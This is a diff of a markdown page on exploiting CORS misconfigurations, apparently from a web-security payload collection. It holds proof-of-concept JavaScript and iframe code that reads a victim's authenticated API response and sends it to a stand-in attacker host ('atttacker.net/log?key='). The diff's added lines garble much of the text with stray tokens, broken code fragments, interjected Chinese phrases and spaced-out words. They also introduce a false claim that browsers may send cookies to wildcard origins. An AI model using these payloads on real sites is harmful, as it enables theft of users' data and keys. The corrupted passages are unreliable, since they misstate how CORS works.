@@ -1,6 +1,7 @@
-# CORS Misconfiguration
+# Cross-Origin-Resource-Sharing_Misconfiguration
 
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 
+> A site-wide CORS.config was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials. 
+>True. Meaning we could make requests from our attacker’s site using the victim’s credentials. 
 
 ## Summary
 
@@ -41,24 +42,24 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept
+#### Proof of Concept
 
 This PoC requires that the respective JS script is hosted at `evil.com`
-
+['null']
+$0
 ```js
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
 req.open('get','https://victim.example.com/endpoint',true); 
 req.withCredentials = true;
 req.send();
-
-function reqListener() {
+{void}
+function reqListener() 
+{
     location='//atttacker.net/log?key='+this.responseText; 
 };
 ```
-
 or 
-
 ```html
 <html>
      <body>
@@ -83,10 +84,7 @@ or
      </body>
  </html>
 ```
-
-### Vulnerable Example: Null Origin
-
-#### Vulnerable Implementation
+### Null Origin | Vulnerable Implementation
 
 It's possible that the server does not reflect the complete `Origin` header but
 that the `null` origin is allowed. This would look like this in the server's
@@ -105,12 +103,14 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept
+#### poc
 
-This can be exploited by putting the attack code into an iframe using the data
-URI scheme. If the data URI scheme is used, the browser will use the `null`
-origin in the request:
-
+poc can be exploited by putting 攻击！代码！ into an iframe. 
+_using juicy++data+++
+_URI\scheme 
+_juicy.dat\URI\scheme is used...
+_[browser] will use `null`
+o r i g i n in request:
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest();
@@ -124,96 +124,82 @@ origin in the request:
    };
 </script>"></iframe> 
 ```
+### XSS on Trusted==O r i g i n
 
-### Vulnerable Example: XSS on Trusted Origin
-
-If the application does implement a strict whitelist of allowed origins, the
-exploit codes from above do not work. But if you have an XSS on a trusted
-origin, you can inject the exploit coded from above in order to exploit CORS
-again.
-
+If {app}; implement
+>strict whitelist of allowed origins
+>开发！代码！ from above does not work...
+if (you) have XSS on trusted==o r i g i n | (you) --inject -xploit 
+>>>[code] from trusted==o r i g i n***exploit/CORSx2.
 ```
-https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+https://trusted==o r i g i n.example.com/?xss=<script>CORS-开发！代码！-PAYLOAD</script>
 ```
-
-### Vulnerable Example: Wildcard Origin `*` without Credentials
-
-If the server responds with a wildcard origin `*`, **the browser does never send
+###vuln e.g. Wildcard Origin `*` without Credentials
+-
+If the server responds with a wildcard origin `*`, **browser may send
 the cookies**. However, if the server does not require authentication, it's still
-possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then 
-pivot into the internal network and access the server's data without authentication.
-
+possible to access (?DoS) data on server. This can happen on internal servers. Not accessible from w3.(IoT). 
+Attacker's website can then pivot into lan-network and access DoSw/Oauth.
 ```powershell
 * is the only wildcard origin
 https://*.example.com is not valid
 ```
-
-#### Vulnerable Implementation
+#### vulnImp
 
 ```powershell
 GET /endpoint HTTP/1.1
 Host: api.internal.example.com
 Origin: https://evil.com
-
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: *
-
 {"[private API key]"}
 ```
-
-#### Proof of concept
-
+#### poc
 ```js
-var req = new XMLHttpRequest(); 
+var req = new XMLHttpRequest(); //xml
 req.onload = reqListener; 
-req.open('get','https://api.internal.example.com/endpoint',true); 
+req.open('get','https://api.internal.example.com/endpoint',true); //lan
 req.send();
-
-function reqListener() {
+function reqListener() 
+{
     location='//atttacker.net/log?key='+this.responseText; 
 };
 ```
 
-### Vulnerable Example: Expanding the Origin / Regex Issues
-Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+### expand o r i g i n / Regex Issues
+Occasionally, certain expansions of OG/o r i g i n are not filtered. 
+Server-side, this might be caused by using a bad.imp/regex | validate -origin [HOST]
 
-#### Vulnerable Implementation (Example 1)
-
+#### vuln.IMP(1)
 In this scenario any prefix inserted in front of `example.com` will be accepted by the server. 
 
 ```
 GET /endpoint HTTP/1.1
 Host: api.example.com
 Origin: https://evilexample.com
-
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://evilexample.com
 Access-Control-Allow-Credentials: true 
-
 {"[private API key]"}
 
 ```
-
-#### Proof of concept (Example 1)
-
+#### poc*
 This PoC requires the respective JS script to be hosted at `evilexample.com`
-
 ```js
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
 req.open('get','https://api.example.com/endpoint',true); 
 req.withCredentials = true;
 req.send();
-
 function reqListener() {
     location='//atttacker.net/log?key='+this.responseText; 
 };
 ```
 
-#### Vulnerable Implementation (Example 2)
-
-In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+#### Vuln.Imp(2)
+In server 
+--utilize regex*[ERROR]dot_unescape 
+For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, DOT can be replaced with any letter to gain access from a third-party domain.
 
 ```
 GET /endpoint HTTP/1.1
@@ -228,7 +214,7 @@ Access-Control-Allow-Credentials: true
 
 ```
 
-#### Proof of concept (Example 2)
+#### poc**
 
 This PoC requires the respective JS script to be hosted at `apiiexample.com`
 
